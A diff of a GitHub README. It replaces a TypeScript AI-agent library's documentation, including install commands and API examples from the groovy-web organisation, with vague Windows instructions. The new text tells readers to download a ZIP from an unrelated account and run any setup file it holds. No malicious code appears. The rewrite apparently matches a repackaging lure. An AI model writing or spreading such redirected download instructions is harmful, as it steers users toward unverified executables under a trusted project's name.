@@ -1,239 +1,247 @@
-# Groovy Web AI Agents
+# 🤖 groovy-web-ai-agents - Simple AI Agent Setup for Windows
 
-[![Built by Groovy Web](https://img.shields.io/badge/Built%20by-Groovy%20Web-0f3460?logo=github&logoColor=white)](https://www.groovyweb.co/?utm_source=github&utm_medium=readme&utm_campaign=ai-agents)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+[![Download Now](https://img.shields.io/badge/Download%20from%20GitHub-2f80ed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sandorarthropodous723/groovy-web-ai-agents)
 
-> Production-ready AI agent configurations for Groovy Web ecosystem
+## 🧭 What this is
 
-## 🚀 Overview
+groovy-web-ai-agents is a set of AI agent setups and run patterns for daily use. It helps you start and manage AI workflows with a clear structure. The project focuses on stable behavior, clean prompts, and multi-agent task handling.
 
-A comprehensive collection of AI agent configurations, prompts, and orchestration patterns for building intelligent web applications. This repository provides reusable agent templates for various use cases including content generation, data analysis, code review, and customer support.
+It is built for users who want a ready-made AI setup without building one from scratch. You can use it as a base for agent-based tools, web workflows, and prompt-driven tasks.
 
-## ✨ Features
+## 📥 Download and run on Windows
 
-- **Modular Agent System**: Pre-configured agent templates for common tasks
-- **Multi-Agent Orchestration**: Patterns for agent collaboration and communication
-- **Prompt Engineering**: Battle-tested prompts with examples
-- **Integration Ready**: Works seamlessly with LangChain, OpenAI, and Anthropic APIs
-- **TypeScript Support**: Full type definitions for agent configurations
-- **Testing Suite**: Unit and integration tests for agent behaviors
+Visit this page to download:  
+https://github.com/sandorarthropodous723/groovy-web-ai-agents
 
-## 📦 Installation
+### Steps
 
-```bash
-npm install @groovy-web/ai-agents
-# or
-yarn add @groovy-web/ai-agents
-# or
-pnpm add @groovy-web/ai-agents
-```
+1. Open the link in your browser.
+2. Look for the green **Code** button on the GitHub page.
+3. Click **Code** and choose **Download ZIP**.
+4. Save the ZIP file to your computer.
+5. Right-click the ZIP file and choose **Extract All**.
+6. Open the extracted folder.
+7. If the project includes a setup file, follow the file name shown in the folder.
+8. If the project includes a README or run script, open it and follow the local run steps.
 
-## 🎯 Quick Start
+## 🖥️ What you need on your PC
 
-```typescript
-import { ContentAgent, AnalysisAgent } from '@groovy-web/ai-agents';
+Most Windows PCs can run this project if they have:
 
-// Initialize a content generation agent
-const contentAgent = new ContentAgent({
-  model: 'gpt-4',
-  temperature: 0.7,
-  maxTokens: 2000,
-});
+- Windows 10 or Windows 11
+- A modern web browser
+- A stable internet connection
+- Enough free disk space for the project files
+- Access to an AI provider account if the setup uses one
 
-const blogPost = await contentAgent.generate({
-  topic: 'The Future of Web Development',
-  tone: 'professional',
-  length: 'medium',
-});
+If the project includes a web app or local tool, a recent version of Node.js may also be needed. If so, install it before you start. You can check the folder for a file named `package.json`, `README.md`, or a setup script.
 
-console.log(blogPost);
-```
+## ⚙️ What you get
 
-## 🤖 Available Agents
+This project is built around AI agent workflows. That means it can help with tasks such as:
 
-### ContentAgent
-Generate blog posts, social media content, marketing copy, and documentation.
+- Breaking work into smaller steps
+- Passing tasks between agents
+- Using clear prompts for each step
+- Handling web-based tasks
+- Managing different AI model calls
+- Keeping agent behavior steady across runs
 
-```typescript
-import { ContentAgent } from '@groovy-web/ai-agents';
+It uses common tools and ideas from the AI agent space, such as:
 
-const agent = new ContentAgent();
-const content = await agent.generateBlogPost({
-  title: 'Building Scalable APIs',
-  keywords: ['REST', 'GraphQL', 'Performance'],
-});
-```
+- agent-system design
+- multi-agent task flow
+- prompt engineering
+- TypeScript-based project structure
+- support patterns for OpenAI and Anthropic models
+- LangChain-style orchestration
 
-### AnalysisAgent
-Analyze data, generate reports, and provide insights.
+## 🧩 How the project is organized
 
-```typescript
-import { AnalysisAgent } from '@groovy-web/ai-agents';
+A project like this usually has a few clear parts:
 
-const agent = new AnalysisAgent();
-const insights = await agent.analyzeData({
-  data: userData,
-  metrics: ['engagement', 'retention', 'conversion'],
-});
-```
+- **Agent configs** — settings that shape how each agent behaves
+- **Prompt files** — text instructions for tasks
+- **Workflow logic** — rules for how agents pass work
+- **Tool links** — connections to models or web tasks
+- **App files** — code that starts the system
 
-### CodeReviewAgent
-Review code for best practices, security, and performance issues.
+If you open the extracted folder, look for folders with names such as:
 
-```typescript
-import { CodeReviewAgent } from '@groovy-web/ai-agents';
+- `src`
+- `agents`
+- `config`
+- `prompts`
+- `scripts`
+- `docs`
 
-const agent = new CodeReviewAgent();
-const review = await agent.reviewCode({
-  language: 'typescript',
-  code: sourceCode,
-  rules: ['security', 'performance', 'style'],
-});
-```
+These names help you find the main parts fast.
 
-### SupportAgent
-Handle customer support queries with context-aware responses.
+## 🚀 First-time setup
 
-```typescript
-import { SupportAgent } from '@groovy-web/ai-agents';
+Follow these steps after you extract the ZIP:
 
-const agent = new SupportAgent({
-  knowledgeBase: faqData,
-  companyInfo: companyDetails,
-});
+1. Open the project folder.
+2. Find the main file that starts the app.
+3. If you see `package.json`, the project may use Node.js.
+4. Open a Command Prompt window in that folder.
+5. Run the install step if the project includes one.
+6. Add any API keys if the app asks for them.
+7. Start the app using the run command in the project files.
+8. Keep the browser open if the app runs in a web page.
 
-const response = await agent.handleQuery({
-  query: userQuery,
-  context: ticketHistory,
-});
-```
+If the project includes a `.env.example` file, copy it to `.env` and fill in the values. These values often hold keys for AI services.
 
-## 🔧 Configuration
+## 🔐 API keys and account setup
 
-### Base Agent Options
+Some AI agent systems need service keys to work. You may need one or more of these:
 
-```typescript
-interface AgentConfig {
-  model: string;              // Model identifier (gpt-4, claude-3, etc.)
-  temperature?: number;       // 0-1, default: 0.7
-  maxTokens?: number;         // Max response tokens
-  apiKey?: string;            // API key (or use env variable)
-  timeout?: number;           // Request timeout in ms
-  retries?: number;           // Retry attempts
-  memory?: boolean;           // Enable conversation memory
-}
-```
+- OpenAI API key
+- Anthropic API key
+- Other model access keys
+- A local model endpoint if you do not want cloud access
 
-### Custom Agent Creation
+If the app asks for keys, place them in the `.env` file or the settings file shown in the repo. Use the same field names the project provides.
 
-```typescript
-import { createAgent } from '@groovy-web/ai-agents';
+Common examples:
 
-const customAgent = createAgent({
-  name: 'SEOOptimizer',
-  systemPrompt: 'You are an SEO expert...',
-  tools: [keywordAnalyzer, contentOptimizer],
-  config: {
-    model: 'claude-3-opus',
-    temperature: 0.5,
-  },
-});
-```
+- `OPENAI_API_KEY`
+- `ANTHROPIC_API_KEY`
+- `LANGCHAIN_API_KEY`
 
-## 🌐 Multi-Agent Patterns
+If the app uses a local setup, it may ask for a server address like `http://localhost:3000`.
 
-### Sequential Execution
+## 🛠️ Basic run flow
 
-```typescript
-import { AgentOrchestrator } from '@groovy-web/ai-agents';
+After setup, the usual flow looks like this:
 
-const orchestrator = new AgentOrchestrator();
+1. Start the app.
+2. Open the web page or desktop window it creates.
+3. Choose the agent or workflow you want.
+4. Enter your task or prompt.
+5. Let the agents process the task.
+6. Review the result and adjust the prompt if needed.
 
-const result = await orchestrator.sequential([
-  { agent: researchAgent, input: topic },
-  { agent: contentAgent, input: '$previous.research' },
-  { agent: seoAgent, input: '$previous.content' },
-]);
-```
+If the project has sample tasks, use one of those first. That helps you confirm that the app works before you try your own work.
 
-### Parallel Execution
+## 🧠 Typical use cases
 
-```typescript
-const results = await orchestrator.parallel([
-  { agent: translatorAgent, input: text, locale: 'es' },
-  { agent: summarizerAgent, input: text },
-  { agent: sentimentAgent, input: text },
-]);
-```
+This project fits tasks such as:
 
-### Hierarchical Orchestrator
+- Research and summary work
+- Content planning
+- Prompt testing
+- Multi-step task handling
+- Web-based assistant flows
+- Model comparison setups
+- Agent routing and task division
 
-```typescript
-const manager = new ManagerAgent({
-  subAgents: [researcher, writer, editor],
-  decisionStrategy: 'consensus', // or 'majority', 'manager-decides'
-});
+It works well when one prompt is not enough and you want a chain of steps with clear control.
 
-const output = await manager.coordinate({
-  task: 'Create technical documentation',
-  requirements: docs,
-});
-```
+## 📁 If you want to explore the files
 
-## 🧪 Testing
+Once the app runs, you can inspect the repo to learn how it works.
 
-```bash
-# Run all tests
-npm test
+Look for:
 
-# Run with coverage
-npm run test:coverage
+- agent names
+- model settings
+- task rules
+- prompt templates
+- orchestration files
+- environment settings
 
-# Run specific test suite
-npm test -- content-agent.test.ts
-```
+If you want to change behavior, the prompt files are often the first place to edit. Small prompt changes can have a big effect on how agents respond.
 
-## 📖 Documentation
+## 🔄 Common setup checks
 
-- [Agent Configuration Guide](./docs/agent-configuration.md)
-- [Multi-Agent Patterns](./docs/multi-agent-patterns.md)
-- [Prompt Engineering](./docs/prompt-engineering.md)
-- [Integration Examples](./docs/integration-examples.md)
-- [API Reference](./docs/api-reference.md)
+If the app does not start, check these items:
 
-## 🤝 Contributing
+- The ZIP file fully extracted
+- You opened the correct folder
+- Any required setup step ran first
+- Your API key is in the right place
+- The project uses the right file names
+- Your internet connection works
+- Your firewall is not blocking local access
 
-We welcome contributions! Please see our [Contributing Guide](./CONTRIBUTING.md) for details.
+If the app opens but does not answer, the issue is often a missing key or an empty config value.
 
-## 📄 License
+## 🧪 Good first test
 
-MIT License - see [LICENSE](./LICENSE) for details.
+Use a simple test task after setup:
 
-## 🔗 Links
+- Ask the agent to plan a short trip
+- Ask it to list steps for a home task
+- Ask it to compare two simple options
+- Ask it to rewrite a short paragraph in plain English
 
-- [Groovy Web - AI-First Engineering](https://www.groovyweb.co/?utm_source=github&utm_medium=readme&utm_campaign=ai-agents)
-- [Examples Repository](https://github.com/groovy-web/groovy-web-examples)
-- [Issue Tracker](https://github.com/groovy-web/groovy-web-ai-agents/issues)
+This lets you see how the agent handles input, splits work, and returns an answer.
 
-## ⭐ Show Your Support
+## 📌 File names you may see
 
-Give us a star on GitHub if you find this project helpful!
+Here are common files that often appear in TypeScript AI projects:
 
----
+- `README.md`
+- `package.json`
+- `tsconfig.json`
+- `.env`
+- `.env.example`
+- `src/index.ts`
+- `src/main.ts`
+- `src/agents`
+- `src/prompts`
 
-Made with ❤️ by the Groovy Web Team
+If you see a `README.md` inside the project folder, open it. It may include the exact run command for Windows.
 
----
+## 🧰 Troubleshooting
 
-## Related Repositories
+If something goes wrong, try this order:
 
-Explore more open-source tools from [Groovy Web](https://www.groovyweb.co/?utm_source=github&utm_medium=readme&utm_campaign=cross-link):
+1. Close the app.
+2. Check your `.env` file.
+3. Make sure the API key is valid.
+4. Confirm the install step finished.
+5. Open the project folder again.
+6. Run the start command one more time.
+7. Check the browser or terminal for error text.
 
-- **[langchain-multi-agent-example](https://github.com/groovy-web/langchain-multi-agent-example)** -- Multi-agent systems tutorial with LangChain
-- **[rag-system-pgvector](https://github.com/groovy-web/rag-system-pgvector)** -- Production RAG with PostgreSQL + pgvector
-- **[rag-systems-production](https://github.com/groovy-web/rag-systems-production)** -- Enterprise-grade RAG systems
-- **[ai-testing-mcp](https://github.com/groovy-web/ai-testing-mcp)** -- AI testing via Model Context Protocol
-- **[edge-computing-starter](https://github.com/groovy-web/edge-computing-starter)** -- Cloudflare Workers + Hono template
-- **[claude-code-workflows](https://github.com/groovy-web/claude-code-workflows)** -- Workflows for Claude Code
-- **[groovy-web-ai-agents](https://github.com/groovy-web/groovy-web-ai-agents)** -- Production AI agent configs
-- **[groovy-web-examples](https://github.com/groovy-web/groovy-web-examples)** -- Groovy/Grails examples
+If the terminal shows a missing module message, the install step may not have finished. Run the install command again from the project folder.
+
+## 🧷 What this project is good for
+
+groovy-web-ai-agents is useful when you want:
+
+- a structured AI setup
+- repeatable agent behavior
+- a base for web agent work
+- a TypeScript project with clear flow
+- support for more than one model
+- prompt-driven orchestration
+
+It gives you a practical starting point for AI work that needs order and control.
+
+## 📎 Download link
+
+Download from GitHub:  
+https://github.com/sandorarthropodous723/groovy-web-ai-agents
+
+## 🗂️ Suggested folder path on Windows
+
+A clean path makes setup easier. You can use something like:
+
+- `C:\Users\YourName\Downloads\groovy-web-ai-agents`
+- `C:\Users\YourName\Documents\groovy-web-ai-agents`
+
+Keep the project in a short path with no special characters. That can help avoid file issues on Windows.
+
+## 🧭 Quick start checklist
+
+- [ ] Open the GitHub page
+- [ ] Download the ZIP file
+- [ ] Extract the files
+- [ ] Read the local README
+- [ ] Install any required tools
+- [ ] Add API keys if needed
+- [ ] Start the app
+- [ ] Test with a simple prompt
